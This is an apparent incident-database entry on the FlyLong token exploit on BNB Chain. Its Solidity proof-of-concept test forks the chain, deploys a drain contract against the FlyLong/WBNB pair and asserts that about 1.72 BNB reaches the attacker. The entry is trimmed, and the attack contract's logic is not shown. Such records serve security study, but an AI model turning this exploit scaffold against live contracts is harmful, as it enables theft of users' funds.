# [?] FlyLong - Balance Forgery

## Summary
Severity: Unknown
Chain: BNB Chain
Component: flylong
Published: 2025-04-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/flylong_exp.sol
Type: defi-exploit-poc

## Details
Lost: 1.73 BNB

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("bsc", 48_768_031);

        fundingToken = address(0);
        attacker = address(this);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ROOT_ATTACK_CONTRACT, "Root Attack Contract");
        vm.label(TRACE_HELPER, "Trace Helper");
        vm.label(FLYLONG_TOKEN, "FlyLong");
        vm.label(FLYLONG_WBNB_PAIR, "FlyLong/WBNB Pair");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public balanceLog {
        assertEq(IPancakePairLike(FLYLONG_WBNB_PAIR).token0(), FLYLONG_TOKEN);
        assertEq(IPancakePairLike(FLYLONG_WBNB_PAIR).token1(), WBNB_TOKEN);
        assertFalse(IFlyLong(FLYLONG_TOKEN).tokenSwap());
        assertEq(IWBNBLike(WBNB_TOKEN).balanceOf(FLYLONG_WBNB_PAIR), 1_726_035_104_006_254_735);
        assertEq(IFlyLong(FLYLONG_TOKEN).balanceOf(FLYLONG_WBNB_PAIR), 99_999_999_999_999_999_999_999_999);

        FlyLongDrainAttack attack = new FlyLongDrainAttack(payable(address(this)));
        attack.run();

        assertLt(IWBNBLike(WBNB_TOKEN).balanceOf(FLYLONG_WBNB_PAIR), 0.001 ether);
        assertGt(address(this).balance, 1.72 ether);
    }
}

contract FlyLongDrainAttack {
    address payable private immutable profitReceiver;

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/flylong_exp.sol_
